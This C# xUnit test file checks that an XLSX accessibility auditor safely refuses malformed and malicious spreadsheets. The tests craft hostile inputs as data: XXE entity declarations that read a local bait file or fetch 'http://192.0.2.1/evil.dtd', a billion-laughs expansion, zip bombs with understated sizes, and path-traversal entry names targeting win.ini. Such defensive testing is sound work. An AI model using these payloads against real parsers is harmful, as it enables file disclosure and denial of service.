using System.Diagnostics;
using System.IO.Compression;
using System.Text;
using D2.Wcag.Fixtures;
using D2.Wcag.Fixtures.Xlsx;
using D2.Wcag.Xlsx;

namespace D2.Wcag.Tests.Xlsx.Core;

// Pliki niezaufane: audytor nie rzuca, nie czyta niczego spoza pakietu i trzyma się limitów. Pliki złośliwe są budowane tutaj.
public class XlsxSecurityTests(Xunit.Abstractions.ITestOutputHelper output)
{
    private static readonly WcagXlsxAuditor Auditor = new();

    /// <summary>Pakiet z podmienionymi albo dodanymi częściami (treść tekstowa).</summary>
    internal static byte[] Repack(IReadOnlyDictionary<string, byte[]> parts, params (string Name, string Content)[] replacements)
    {
        var all = new SortedDictionary<string, byte[]>(parts.ToDictionary(p => p.Key, p => p.Value), StringComparer.Ordinal);
        foreach (var (name, content) in replacements)
        {
            all[name] = Encoding.UTF8.GetBytes(content);
        }

        return ZipOf(all.Select(p => (p.Key, p.Value)));
    }

    internal static byte[] ZipOf(IEnumerable<(string Name, byte[] Content)> entries, CompressionLevel level = CompressionLevel.Optimal)
    {
        using var output = new MemoryStream();
        using (var archive = new ZipArchive(output, ZipArchiveMode.Create, leaveOpen: true))
        {
            foreach (var (name, content) in entries)
            {
                using var stream = archive.CreateEntry(name, level).Open();
                stream.Write(content);
            }
        }

        return output.ToArray();
    }

    /// <summary>Mały poprawny skoroszyt: jeden arkusz z tekstem w A1 (teksty wspólne).</summary>
    private static IReadOnlyDictionary<string, byte[]> SmallWorkbookParts()
    {
        var fx = new FixtureXlsx { Title = "Test" };
        fx.AddSheet("Dane").Text("A1", "tekst").Number("B1", 1);
        return FixtureXlsx.Parts(fx.Build());
    }

    private static string Part(IReadOnlyDictionary<string, byte[]> parts, string name) => Encoding.UTF8.GetString(parts[name]);

    private static void AssertRefused(XlsxAuditResult result, params XlsxFailure[] allowed)
    {
        Assert.False(result.IsReadable);
        Assert.Contains(result.Failure, allowed);
        Assert.False(string.IsNullOrWhiteSpace(result.FailureMessage));
        Assert.Equal(result.FailureMessage, result.Summary);
        Assert.Null(result.Workbook);
        Assert.Empty(result.Findings);
        Assert.Empty(result.ManualChecks);
        Assert.Empty(result.Criteria);
        Assert.Equal(new XlsxCounts(0, 0, 0, 0, 0), result.Counts);
        Assert.Equal("2.2", result.WcagVersion);
        // Komunikat jest po polsku i nie zdradza szczegółów wyjątku.
        Assert.DoesNotContain("Exception", result.FailureMessage);
        Assert.DoesNotContain("   at ", result.FailureMessage);
    }

    // ---------- złe wejście ----------

    [Fact]
    public void EmptyFile_IsRefused()
    {
        AssertRefused(Auditor.Audit(Array.Empty<byte>()), XlsxFailure.Empty);
        AssertRefused(Auditor.Audit(new MemoryStream()), XlsxFailure.Empty);
    }

    [Fact]
    public void TooLargeFile_IsRefused_BeforeParsing()
    {
        var workbook = XlsxFixtureCatalog.Build("clean");
        var profile = new XlsxAuditProfile { Limits = new XlsxLimits { MaxFileBytes = workbook.Length - 1 } };

        AssertRefused(Auditor.Audit(workbook, profile), XlsxFailure.TooLarge);
        AssertRefused(Auditor.Audit(new MemoryStream(workbook), profile), XlsxFailure.TooLarge);
        Assert.True(Auditor.Audit(workbook, new XlsxAuditProfile { Limits = new XlsxLimits { MaxFileBytes = workbook.Length } }).IsReadable);
        Assert.Contains("20 MB", Auditor.Audit(new byte[(20 * 1024 * 1024) + 1]).FailureMessage);
    }

    [Fact]
    public void RandomBytes_AreRefused_AsNotZip()
    {
        var random = new Random(12345);
        for (var i = 0; i < 50; i++)
        {
            var bytes = new byte[random.Next(1, 4096)];
            random.NextBytes(bytes);
            if (bytes.Length >= 2 && bytes[0] == (byte)'P' && bytes[1] == (byte)'K')
            {
                bytes[0] = 0;
            }

            if (bytes[0] == 0xD0)
            {
                bytes[0] = 1;
            }

            AssertRefused(Auditor.Audit(bytes), XlsxFailure.NotZip);
        }
    }

    [Fact]
    public void RandomBytesBehindZipSignature_AreRefused_AsCorrupted()
    {
        var random = new Random(54321);
        for (var i = 0; i < 50; i++)
        {
            var bytes = new byte[random.Next(8, 4096)];
            random.NextBytes(bytes);
            bytes[0] = (byte)'P';
            bytes[1] = (byte)'K';
            bytes[2] = 3;
            bytes[3] = 4;

            AssertRefused(Auditor.Audit(bytes), XlsxFailure.Corrupted);
        }
    }

    [Fact]
    public void TruncatedZip_AtEveryLength_NeverThrows()
    {
        var workbook = XlsxFixtureCatalog.Build("clean");

        for (var length = 1; length < workbook.Length; length += 97)
        {
            AssertRefused(Auditor.Audit(workbook[..length]), XlsxFailure.Corrupted, XlsxFailure.NotZip);
        }
    }

    [Fact]
    public void CorruptedCompressedData_IsRefused_AsCorrupted()
    {
        var workbook = XlsxFixtureCatalog.Build("structure");
        var random = new Random(777);
        var refused = 0;

        // Psujemy losowe bajty w środku archiwum (dane skompresowane); katalog na końcu zostaje.
        for (var attempt = 0; attempt < 40; attempt++)
        {
            var copy = (byte[])workbook.Clone();
            for (var i = 0; i < 64; i++)
            {
                copy[random.Next(64, copy.Length / 2)] = (byte)random.Next(256);
            }

            var result = Auditor.Audit(copy);
            if (!result.IsReadable)
            {
                AssertRefused(result, XlsxFailure.Corrupted, XlsxFailure.NotSpreadsheet, XlsxFailure.NotZip, XlsxFailure.LimitExceeded);
                refused++;
            }
        }

        Assert.True(refused > 0);
    }

    [Fact]
    public void WordDocument_GivenAsWorkbook_IsRefused_WithClearMessage()
    {
        var result = Auditor.Audit(FixtureCatalog.Build("clean"));

        AssertRefused(result, XlsxFailure.WordDocument);
        Assert.Contains("dokument Word (.docx)", result.FailureMessage);
        Assert.Contains(".xlsx", result.FailureMessage);
    }

    [Fact]
    public void UnsupportedFormats_Xls_Xlsb_Ods_AreRefused()
    {
        var xls = Auditor.Audit(OfficePackageTests.Ole("Root Entry", "Workbook"));
        var xlsb = Auditor.Audit(OfficePackageTests.Zip(
            ("[Content_Types].xml", OfficePackageTests.ContentTypes("/xl/workbook.bin", "application/vnd.ms-excel.sheet.binary.macroEnabled.main")),
            ("xl/workbook.bin", "binarny")));
        var ods = Auditor.Audit(OfficePackageTests.Zip(("mimetype", "application/vnd.oasis.opendocument.spreadsheet"), ("content.xml", "<x/>")));

        AssertRefused(xls, XlsxFailure.UnsupportedFormat);
        Assert.Contains(".xls", xls.FailureMessage);
        AssertRefused(xlsb, XlsxFailure.UnsupportedFormat);
        Assert.Contains(".xlsb", xlsb.FailureMessage);
        AssertRefused(ods, XlsxFailure.UnsupportedFormat);
        Assert.Contains(".ods", ods.FailureMessage);
        Assert.All(new[] { xls, xlsb, ods }, r => Assert.StartsWith("Format nieobsługiwany", r.FailureMessage));
    }

    [Fact]
    public void EncryptedWorkbook_IsRefused_AsEncrypted_NotAsOldFormat()
    {
        var result = Auditor.Audit(OfficePackageTests.Ole("Root Entry", "EncryptionInfo", "EncryptedPackage"));

        AssertRefused(result, XlsxFailure.Encrypted);
        Assert.Contains("zaszyfrowany hasłem", result.FailureMessage);
    }

    [Fact]
    public void OtherZips_AreRefused_AsNotSpreadsheet()
    {
        AssertRefused(Auditor.Audit(OfficePackageTests.Zip(("readme.txt", "x"))), XlsxFailure.NotSpreadsheet);
        var presentation = Auditor.Audit(OfficePackageTests.Zip(("ppt/presentation.xml", "<p/>")));
        AssertRefused(presentation, XlsxFailure.NotSpreadsheet);
        Assert.Contains("prezentacja PowerPoint", presentation.FailureMessage);
        // Typ części głównej mówi „arkusz”, ale części skoroszytu nie ma.
        AssertRefused(Auditor.Audit(OfficePackageTests.Zip(
            ("[Content_Types].xml", OfficePackageTests.ContentTypes("/xl/workbook.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml")))),
            XlsxFailure.NotSpreadsheet);
        AssertRefused(Auditor.Audit(OfficePackageTests.Zip(("xl/workbook.xml", "<innyKorzen/>"))), XlsxFailure.NotSpreadsheet);
        AssertRefused(Auditor.Audit(OfficePackageTests.Zip(("xl/workbook.xml", "to nie jest XML"))), XlsxFailure.Corrupted);
    }

    // ---------- DTD, XXE, encje ----------

    public static TheoryData<string> XxeParts() => ["xl/sharedStrings.xml", "xl/worksheets/sheet1.xml", "xl/workbook.xml", "xl/styles.xml", "docProps/core.xml", "xl/_rels/workbook.xml.rels"];

    [Theory]
    [MemberData(nameof(XxeParts))]
    public void ExternalEntity_IsNeverResolved_BaitFileIsNotRead(string partName)
    {
        var bait = Path.Combine(Path.GetTempPath(), "d2-wcag-xxe-" + Guid.NewGuid().ToString("N") + ".txt");
        const string Secret = "SEKRET-PRZYNETA-4f1c9a";
        File.WriteAllText(bait, Secret);
        try
        {
            var parts = SmallWorkbookParts();
            var original = Part(parts, partName);
            var declarationEnd = original.IndexOf("?>", StringComparison.Ordinal) + 2;
            var doctype = $"<!DOCTYPE x [<!ENTITY xxe SYSTEM \"{new Uri(bait).AbsoluteUri}\">]>";
            // Encja wstawiona w treść tekstową tam, gdzie część ją ma; w pozostałych wystarcza sama deklaracja DTD.
            var body = original[declarationEnd..]
                .Replace("<t>tekst</t>", "<t>&xxe;</t>")
                .Replace("<v>1</v>", "<v>&xxe;</v>")
                .Replace("<dc:title>Test</dc:title>", "<dc:title>&xxe;</dc:title>");
            var malicious = Repack(parts, (partName, original[..declarationEnd] + doctype + body));

            var result = Auditor.Audit(malicious);

            AssertRefused(result, XlsxFailure.Corrupted);
            Assert.Contains("DTD", result.FailureMessage);
            Assert.DoesNotContain(Secret, result.FailureMessage);
            Assert.DoesNotContain(Secret, Snapshot.Json(XlsxSnapshotTests.Project(result)));
            var exception = Assert.Throws<XlsxReadException>(() => XlsxPackageReader.Read(malicious));
            Assert.Equal(XlsxFailure.Corrupted, exception.Failure);
        }
        finally
        {
            File.Delete(bait);
        }
    }

    [Fact]
    public void ExternalEntity_OverHttp_IsNotFetched()
    {
        // Adres z zakresu dokumentacyjnego (TEST-NET-1): próba pobrania wisiałaby na limicie czasu połączenia.
        var parts = SmallWorkbookParts();
        var shared = Part(parts, "xl/sharedStrings.xml").Replace("?>", "?><!DOCTYPE sst [<!ENTITY % remote SYSTEM \"http://192.0.2.1/evil.dtd\"> %remote;]>");
        var stopwatch = Stopwatch.StartNew();

        var result = Auditor.Audit(Repack(parts, ("xl/sharedStrings.xml", shared)));

        AssertRefused(result, XlsxFailure.Corrupted);
        Assert.True(stopwatch.Elapsed < TimeSpan.FromSeconds(5), $"Odmowa trwała {stopwatch.Elapsed} – czyżby próba połączenia?");
    }

    [Fact]
    public void BillionLaughs_IsRefused_Quickly_WithoutExpandingEntities()
    {
        var entities = new StringBuilder("<!DOCTYPE lolz [<!ENTITY lol \"lol\">");
        for (var i = 1; i <= 9; i++)
        {
            entities.Append($"<!ENTITY lol{i} \"{string.Concat(Enumerable.Repeat($"&lol{(i == 1 ? "" : (i - 1).ToString())};", 10))}\">");
        }

        entities.Append("]>");
        var parts = SmallWorkbookParts();
        foreach (var partName in new[] { "xl/sharedStrings.xml", "xl/worksheets/sheet1.xml" })
        {
            var xml = Part(parts, partName).Replace("?>", "?>" + entities).Replace("<t>tekst</t>", "<t>&lol9;</t>").Replace("<v>1</v>", "<v>&lol9;</v>");
            var before = GC.GetTotalMemory(forceFullCollection: true);
            var stopwatch = Stopwatch.StartNew();

            var result = Auditor.Audit(Repack(parts, (partName, xml)));

            AssertRefused(result, XlsxFailure.Corrupted);
            Assert.Contains("DTD", result.FailureMessage);
            Assert.True(stopwatch.Elapsed < TimeSpan.FromSeconds(5));
            Assert.True(GC.GetTotalMemory(forceFullCollection: false) - before < 50 * 1024 * 1024);
        }
    }

    [Fact]
    public void UndeclaredEntity_And_MalformedXml_AreCorrupted()
    {
        var parts = SmallWorkbookParts();
        var sheet = Part(parts, "xl/worksheets/sheet1.xml");

        AssertRefused(Auditor.Audit(Repack(parts, ("xl/worksheets/sheet1.xml", sheet.Replace("<v>1</v>", "<v>&nieznana;</v>")))), XlsxFailure.Corrupted);
        AssertRefused(Auditor.Audit(Repack(parts, ("xl/worksheets/sheet1.xml", sheet[..(sheet.Length / 2)]))), XlsxFailure.Corrupted);
        AssertRefused(Auditor.Audit(Repack(parts, ("xl/sharedStrings.xml", "<sst><si><t>niezamknięty"))), XlsxFailure.Corrupted);
        AssertRefused(Auditor.Audit(Repack(parts, ("xl/worksheets/sheet1.xml", sheet.Replace("r=\"B1\"", "r=\"ZZZZ99999999\"")))), XlsxFailure.Corrupted);
    }

    // ---------- relacje zewnętrzne ----------

    [Fact]
    public void ExternalRelationships_AreKeptAsText_NeverFollowed()
    {
        var parts = SmallWorkbookParts();
        // Arkusz wskazany relacją zewnętrzną i relacja do pliku poza pakietem.
        var rels = Part(parts, "xl/_rels/workbook.xml.rels")
            .Replace("Target=\"worksheets/sheet1.xml\"", "Target=\"file:///c:/windows/win.ini\" TargetMode=\"External\"");
        var external = XlsxTestData.Read(Repack(parts, ("xl/_rels/workbook.xml.rels", rels)));
        var escaping = XlsxTestData.Read(Repack(parts,
            ("xl/_rels/workbook.xml.rels", Part(parts, "xl/_rels/workbook.xml.rels").Replace("Target=\"worksheets/sheet1.xml\"", "Target=\"../../../../windows/win.ini\""))));

        Assert.Empty(Assert.Single(external.Sheets).Cells);
        Assert.Empty(Assert.Single(escaping.Sheets).Cells);
        Assert.Null(XlsxPackage.ResolveTarget("xl/", "../../poza.xml"));
        Assert.Equal("xl/media/image1.png", XlsxPackage.ResolveTarget("xl/drawings/", "../media/image1.png"));
        Assert.Equal("docProps/core.xml", XlsxPackage.ResolveTarget("xl/", "/docProps/core.xml"));

        // Łącze zewnętrzne w komórce: cel tylko jako tekst.
        var link = Assert.Single(XlsxTestData.Workbook("clean").Sheet("Informacje").Hyperlinks);
        Assert.True(link.IsExternal);
        Assert.Equal("https://example.com/regulamin-budzetowania", link.Target);
    }

    // ---------- ZIP: ścieżki, liczba wpisów, bomby ----------

    [Theory]
    [InlineData("../poza-pakietem.xml")]
    [InlineData("xl/../../poza.xml")]
    [InlineData("/xl/absolutna.xml")]
    [InlineData("xl\\..\\..\\okna.xml")]
    [InlineData("c:/windows/win.ini")]
    public void EntryNames_WithTraversal_AreRefused(string entryName)
    {
        var parts = SmallWorkbookParts();
        var malicious = ZipOf(parts.Select(p => (p.Key, p.Value)).Append((entryName, "x"u8.ToArray())));

        var result = Auditor.Audit(malicious);

        AssertRefused(result, XlsxFailure.Corrupted);
        Assert.Contains("niedozwolone ścieżki", result.FailureMessage);
    }

    [Fact]
    public void DuplicateEntryNames_AreRefused()
    {
        var parts = SmallWorkbookParts();
        var malicious = ZipOf(parts.Select(p => (p.Key, p.Value)).Append(("XL/WORKBOOK.XML", "<workbook/>"u8.ToArray())));

        AssertRefused(Auditor.Audit(malicious), XlsxFailure.Corrupted);
    }

    [Fact]
    public void TooManyEntries_AreRefused()
    {
        var parts = SmallWorkbookParts();
        var padded = ZipOf(parts.Select(p => (p.Key, p.Value)).Concat(Enumerable.Range(0, 300).Select(i => ($"xl/media/pusty{i}.bin", Array.Empty<byte>()))));

        Assert.True(Auditor.Audit(padded).IsReadable);
        var result = Auditor.Audit(padded, new XlsxAuditProfile { Limits = new XlsxLimits { MaxEntries = 100 } });
        AssertRefused(result, XlsxFailure.LimitExceeded);
        Assert.Contains("zbyt wiele części", result.FailureMessage);

        // Ponad domyślny limit 5000.
        var huge = ZipOf(parts.Select(p => (p.Key, p.Value)).Concat(Enumerable.Range(0, 5001).Select(i => ($"x/{i}", Array.Empty<byte>()))), CompressionLevel.NoCompression);
        AssertRefused(Auditor.Audit(huge), XlsxFailure.LimitExceeded);
    }

    [Fact]
    public void ZipBomb_HighCompressionRatio_IsRefused_FromDirectory()
    {
        // 50 MB zer w arkuszu: współczynnik kompresji ok. 1000:1, plik ma kilkadziesiąt kB.
        var parts = SmallWorkbookParts();
        var bomb = ZipOf(parts.Where(p => p.Key != "xl/worksheets/sheet1.xml").Select(p => (p.Key, p.Value))
            .Append(("xl/worksheets/sheet1.xml", new byte[50 * 1024 * 1024])));
        Assert.True(bomb.Length < 200 * 1024);
        var stopwatch = Stopwatch.StartNew();

        var result = Auditor.Audit(bomb);

        AssertRefused(result, XlsxFailure.LimitExceeded);
        Assert.Contains("współczynnik kompresji", result.FailureMessage);
        Assert.True(stopwatch.Elapsed < TimeSpan.FromSeconds(2));
    }

    [Fact]
    public void ZipBomb_DeclaredSizes_AreRefused_PerPartAndInTotal()
    {
        var parts = SmallWorkbookParts();
        // Dane nieskompresowane (współczynnik 1:1), za to duże: 3 MB w części i 6 MB łącznie.
        var random = new Random(1);
        var noise = new byte[3 * 1024 * 1024];
        random.NextBytes(noise);
        var big = ZipOf(parts.Select(p => (p.Key, p.Value)).Append(("xl/media/a.bin", noise)).Append(("xl/media/b.bin", noise)), CompressionLevel.NoCompression);

        Assert.True(Auditor.Audit(big).IsReadable);
        var perPart = Auditor.Audit(big, new XlsxAuditProfile { Limits = new XlsxLimits { MaxPartBytes = 2 * 1024 * 1024 } });
        AssertRefused(perPart, XlsxFailure.LimitExceeded);
        var total = Auditor.Audit(big, new XlsxAuditProfile { Limits = new XlsxLimits { MaxUncompressedBytes = 5 * 1024 * 1024 } });
        AssertRefused(total, XlsxFailure.LimitExceeded);
        Assert.Contains("po rozpakowaniu", total.FailureMessage);
    }

    [Fact]
    public void ZipBomb_UnderstatedDeclaredSize_IsStopped_OnBytesActuallyRead()
    {
        // Arkusz z 8 MB treści; w nagłówkach ZIP wpisujemy rozmiar 1000 bajtów. Kontrola katalogu przepuszcza taki plik –
        // zatrzymać go musi licznik faktycznie rozpakowanych bajtów (albo biblioteka ZIP, która wykryje niezgodność).
        var parts = SmallWorkbookParts();
        var sheet = new StringBuilder("<?xml version=\"1.0\" encoding=\"UTF-8\"?><worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>");
        var random = new Random(3);
        for (var row = 1; sheet.Length < 8 * 1024 * 1024; row++)
        {
            sheet.Append($"<row r=\"{row}\"><c r=\"A{row}\"><v>{random.Next()}</v></c><c r=\"B{row}\"><v>{random.Next()}</v></c></row>");
        }

        sheet.Append("</sheetData></worksheet>");
        var actualLength = Encoding.UTF8.GetByteCount(sheet.ToString());
        var honest = Repack(parts, ("xl/worksheets/sheet1.xml", sheet.ToString()));
        var lying = PatchDeclaredSize(honest, "xl/worksheets/sheet1.xml", actualLength, 1000);
        var limits = new XlsxLimits { MaxPartBytes = 2 * 1024 * 1024 };

        // Uczciwy plik odpada już na katalogu…
        AssertRefused(Auditor.Audit(honest, new XlsxAuditProfile { Limits = limits }), XlsxFailure.LimitExceeded);
        // …a kłamiący na odczycie: albo nasz licznik, albo wykryta niezgodność rozmiaru.
        var budget = new XlsxReadBudget(limits, CancellationToken.None);
        var result = Auditor.Audit(lying, new XlsxAuditProfile { Limits = limits });
        AssertRefused(result, XlsxFailure.LimitExceeded, XlsxFailure.Corrupted);
        output.WriteLine($"Zaniżony rozmiar zadeklarowany: {result.Failure} – {result.FailureMessage}");
        var exception = Assert.Throws<XlsxReadException>(() => XlsxPackageReader.Read(lying, budget));
        Assert.Contains(exception.Failure, new[] { XlsxFailure.LimitExceeded, XlsxFailure.Corrupted });
        output.WriteLine($"Faktycznie przeczytano {budget.BytesRead} bajtów (limit części {limits.MaxPartBytes}).");
        Assert.True(budget.BytesRead <= limits.MaxPartBytes + (1024 * 1024), $"Przeczytano {budget.BytesRead} bajtów mimo limitu {limits.MaxPartBytes}.");
    }

    [Fact]
    public void LimitedStream_CountsActualBytes_IndependentlyOfZipLibrary()
    {
        // Sam strumień z limitem: 5 MB danych przy limicie 1 MB na część – przerwanie zaraz po przekroczeniu limitu.
        var data = new byte[5 * 1024 * 1024];
        new Random(5).NextBytes(data);
        var budget = new XlsxReadBudget(new XlsxLimits(), CancellationToken.None);
        using var limited = new XlsxPackage.LimitedStream(new MemoryStream(data), "xl/test.xml", 1024 * 1024, data.Length, budget);
        var buffer = new byte[64 * 1024];
        long read = 0;

        var exception = Assert.Throws<XlsxReadException>(() =>
        {
            int count;
            while ((count = limited.Read(buffer, 0, buffer.Length)) > 0)
            {
                read += count;
            }
        });

        Assert.Equal(XlsxFailure.LimitExceeded, exception.Failure);
        Assert.InRange(read, 1024 * 1024 - buffer.Length, 1024 * 1024);

        // Współczynnik kompresji liczony na faktycznych bajtach: 3 MB odczytane przy 100 bajtach skompresowanych.
        using var ratio = new XlsxPackage.LimitedStream(new MemoryStream(data), "xl/test.xml", long.MaxValue, 100, new XlsxReadBudget(new XlsxLimits(), CancellationToken.None));
        var ratioException = Assert.Throws<XlsxReadException>(() =>
        {
            while (ratio.Read(buffer, 0, buffer.Length) > 0)
            {
            }
        });
        Assert.Contains("współczynnik kompresji", ratioException.Message);

        // Limit łączny: dwie części po 3 MB przy limicie 5 MB.
        var totalBudget = new XlsxReadBudget(new XlsxLimits { MaxUncompressedBytes = 5 * 1024 * 1024 }, CancellationToken.None);
        Assert.Throws<XlsxReadException>(() =>
        {
            for (var part = 0; part < 2; part++)
            {
                using var stream = new XlsxPackage.LimitedStream(new MemoryStream(data, 0, 3 * 1024 * 1024), "xl/test.xml", long.MaxValue, data.Length, totalBudget);
                while (stream.Read(buffer, 0, buffer.Length) > 0)
                {
                }
            }
        });
        Assert.InRange(totalBudget.BytesRead, 5 * 1024 * 1024, (5 * 1024 * 1024) + buffer.Length);
    }

    /// <summary>Nadpisuje zadeklarowany rozmiar po rozpakowaniu w nagłówku lokalnym i w katalogu centralnym wpisu.</summary>
    private static byte[] PatchDeclaredSize(byte[] zip, string entryName, int actualLength, int declaredLength)
    {
        var copy = (byte[])zip.Clone();
        var name = Encoding.UTF8.GetBytes(entryName);
        var patched = 0;
        for (var i = 0; i + 46 + name.Length <= copy.Length; i++)
        {
            if (copy[i] != (byte)'P' || copy[i + 1] != (byte)'K')
            {
                continue;
            }

            // Nagłówek lokalny: sygnatura 03 04, rozmiar po rozpakowaniu na pozycji 22, nazwa na 30.
            // Katalog centralny: sygnatura 01 02, rozmiar po rozpakowaniu na pozycji 24, nazwa na 46.
            var (sizeOffset, nameOffset) = (copy[i + 2], copy[i + 3]) switch
            {
                (3, 4) => (22, 30),
                (1, 2) => (24, 46),
                _ => (-1, -1),
            };
            if (sizeOffset < 0 || !copy.AsSpan(i + nameOffset, name.Length).SequenceEqual(name))
            {
                continue;
            }

            var declared = BitConverter.ToInt32(copy, i + sizeOffset);
            if (declared == actualLength)
            {
                BitConverter.GetBytes(declaredLength).CopyTo(copy, i + sizeOffset);
                patched++;
            }
        }

        Assert.True(patched >= 1, "Nie znaleziono wpisu do spreparowania.");
        return copy;
    }

    // ---------- limity modelu i czasu ----------

    [Fact]
    public void MaxCells_IsEnforced_WhileReading()
    {
        var edge = XlsxSnapshotCases.Load("edge");
        var budget = new XlsxReadBudget(new XlsxLimits { MaxCells = 100_000 }, CancellationToken.None);

        var result = Auditor.Audit(edge, new XlsxAuditProfile { Limits = new XlsxLimits { MaxCells = 100_000 } });

        AssertRefused(result, XlsxFailure.LimitExceeded);
        Assert.Contains("100000", result.FailureMessage);
        Assert.Throws<XlsxReadException>(() => XlsxPackageReader.Read(edge, budget));
        Assert.Equal(100_001, budget.Cells);
        // Limit liczy także komórki z samym stylem.
        var fx = new FixtureXlsx();
        var sheet = fx.AddSheet("Style");
        for (var column = 1; column <= 20; column++)
        {
            sheet.Styled(new CellRef(1, column).ToString(), 0);
        }

        AssertRefused(Auditor.Audit(fx.Build(), new XlsxAuditProfile { Limits = new XlsxLimits { MaxCells = 19 } }), XlsxFailure.LimitExceeded);
        Assert.True(Auditor.Audit(fx.Build(), new XlsxAuditProfile { Limits = new XlsxLimits { MaxCells = 20 } }).IsReadable);
    }

    [Fact]
    public void MaxSheets_IsEnforced()
    {
        var result = Auditor.Audit(XlsxFixtureCatalog.Build("structure"), new XlsxAuditProfile { Limits = new XlsxLimits { MaxSheets = 7 } });

        AssertRefused(result, XlsxFailure.LimitExceeded);
        Assert.Contains("zbyt wiele arkuszy", result.FailureMessage);
    }

    [Fact]
    public void Timeout_IsEnforced_WhileReading()
    {
        var edge = XlsxSnapshotCases.Load("edge");
        var stopwatch = Stopwatch.StartNew();

        var result = Auditor.Audit(edge, new XlsxAuditProfile { Limits = new XlsxLimits { Timeout = TimeSpan.FromMilliseconds(1) } });

        AssertRefused(result, XlsxFailure.Timeout);
        Assert.Contains("limit czasu", result.FailureMessage);
        Assert.True(stopwatch.Elapsed < TimeSpan.FromSeconds(5), $"Przerwanie trwało {stopwatch.Elapsed}.");
    }

    [Fact]
    public void Timeout_IsEnforced_InRules()
    {
        var slow = new SlowRule();
        var auditor = new WcagXlsxAuditor([slow]);
        var stopwatch = Stopwatch.StartNew();

        var result = auditor.Audit(XlsxFixtureCatalog.Build("clean"), new XlsxAuditProfile { Limits = new XlsxLimits { Timeout = TimeSpan.FromMilliseconds(300) } });

        AssertRefused(result, XlsxFailure.Timeout);
        Assert.True(stopwatch.Elapsed < TimeSpan.FromSeconds(10));
    }

    private sealed class SlowRule : IXlsxRule
    {
        public IReadOnlyList<XlsxRuleDescriptor> Descriptors { get; } =
            [new XlsxRuleDescriptor("T-SLOW", "Wolna reguła", [], XlsxCheckType.Auto, "-") { BestPractice = true }];

        public IEnumerable<XlsxRuleHit> Check(XlsxWorkbook workbook, XlsxAuditContext context)
        {
            // Reguła, która się nie kończy: jedyne wyjście to kontrola limitu czasu w kontekście.
            while (true)
            {
                context.ThrowIfCancellationRequested();
                Thread.Sleep(5);
            }

#pragma warning disable CS0162 // Kod nieosiągalny – iterator musi mieć yield.
            yield break;
#pragma warning restore CS0162
        }
    }

    [Fact]
    public void Cancellation_StopsReading_AndPropagates()
    {
        var edge = XlsxSnapshotCases.Load("edge");
        using var cancelled = new CancellationTokenSource();
        cancelled.Cancel();

        Assert.ThrowsAny<OperationCanceledException>(() => Auditor.Audit(edge, cancellationToken: cancelled.Token));

        using var soon = new CancellationTokenSource(TimeSpan.FromMilliseconds(20));
        var stopwatch = Stopwatch.StartNew();
        // Powtarzamy, aż anulowanie trafi w trakcie odczytu (pojedynczy odczyt trwa ułamek sekundy).
        Action untilCancelled = () =>
        {
            for (var i = 0; i < 1000; i++)
            {
                Auditor.Audit(edge, cancellationToken: soon.Token);
            }
        };
        Assert.ThrowsAny<OperationCanceledException>(untilCancelled);
        Assert.True(stopwatch.Elapsed < TimeSpan.FromSeconds(10));
    }

    // ---------- skrajne, ale poprawne arkusze ----------

    [Fact]
    public void Sheet_With16384Columns_IsRead()
    {
        var sheet = new StringBuilder("<?xml version=\"1.0\" encoding=\"UTF-8\"?><worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\">");
        for (var column = 1; column <= CellRef.MaxColumn; column++)
        {
            sheet.Append($"<c r=\"{CellRef.ColumnName(column)}1\"><v>{column}</v></c>");
        }

        sheet.Append("</row><row r=\"1048576\"><c r=\"XFD1048576\" t=\"inlineStr\"><is><t>ostatnia komórka</t></is></c></row></sheetData></worksheet>");
        var bytes = Repack(SmallWorkbookParts(), ("xl/worksheets/sheet1.xml", sheet.ToString()));

        var workbook = XlsxTestData.Read(bytes);
        var result = Auditor.Audit(bytes);

        var read = Assert.Single(workbook.Sheets);
        Assert.Equal(16385, read.Cells.Count);
        Assert.Equal(RangeRef.Parse("A1:XFD1048576"), read.UsedRange);
        Assert.Equal("16384", read.TextAt(CellRef.Parse("XFD1")));
        Assert.Equal("703", read.TextAt(CellRef.Parse("AAA1")));
        Assert.Equal("ostatnia komórka", read.TextAt(new CellRef(CellRef.MaxRow, CellRef.MaxColumn)));
        Assert.Equal("Dane!XFD1048576", XlsxLocation.OfCell(read, read.Cells[^1].Ref).Display);
        Assert.True(result.IsReadable, result.FailureMessage);
        Assert.Equal(16385, result.Workbook!.Cells);
    }

    [Theory]
    [InlineData("<c r=\"XFE1\"><v>1</v></c>")]
    [InlineData("<c r=\"A1048577\"><v>1</v></c>")]
    [InlineData("<c r=\"A0\"><v>1</v></c>")]
    [InlineData("<c r=\"1A\"><v>1</v></c>")]
    public void Cell_OutsideSheetBounds_IsCorrupted(string cell)
    {
        var sheet = $"<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\">{cell}</row></sheetData></worksheet>";

        AssertRefused(Auditor.Audit(Repack(SmallWorkbookParts(), ("xl/worksheets/sheet1.xml", sheet))), XlsxFailure.Corrupted);
    }

    [Fact]
    public void Sheet_WithoutCellReferences_UnorderedRows_AndBadIndexes_IsReadSafely()
    {
        // Komórki bez atrybutu r (pozycja z kolejności), wiersze nie po kolei, indeks tekstu wspólnego i stylu spoza zakresu.
        const string Sheet = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>"
            + "<row r=\"3\"><c><v>31</v></c><c><v>32</v></c></row>"
            + "<row r=\"1\"><c r=\"B1\"><v>12</v></c><c r=\"A1\" t=\"s\"><v>0</v></c></row>"
            + "<row><c t=\"s\" s=\"999\"><v>12345</v></c><c t=\"s\"><v>-1</v></c><c t=\"s\"><v>abc</v></c></row>"
            + "</sheetData></worksheet>";

        var sheet = Assert.Single(XlsxTestData.Read(Repack(SmallWorkbookParts(), ("xl/worksheets/sheet1.xml", Sheet))).Sheets);

        Assert.Equal(["A1", "B1", "A2", "B2", "C2", "A3", "B3"], sheet.Cells.Select(c => c.Ref.ToString()));
        Assert.Equal(["tekst", "12", "", "", "", "31", "32"], sheet.Cells.Select(c => c.Text));
        Assert.Equal(0, sheet.Cell(CellRef.Parse("A2"))!.Value.StyleIndex);
        Assert.False(sheet.Cell(CellRef.Parse("A2"))!.Value.HasValue);
        Assert.Equal(RangeRef.Parse("A1:B3"), sheet.UsedRange);
    }

    [Fact]
    public void MissingOptionalParts_GiveDefaults()
    {
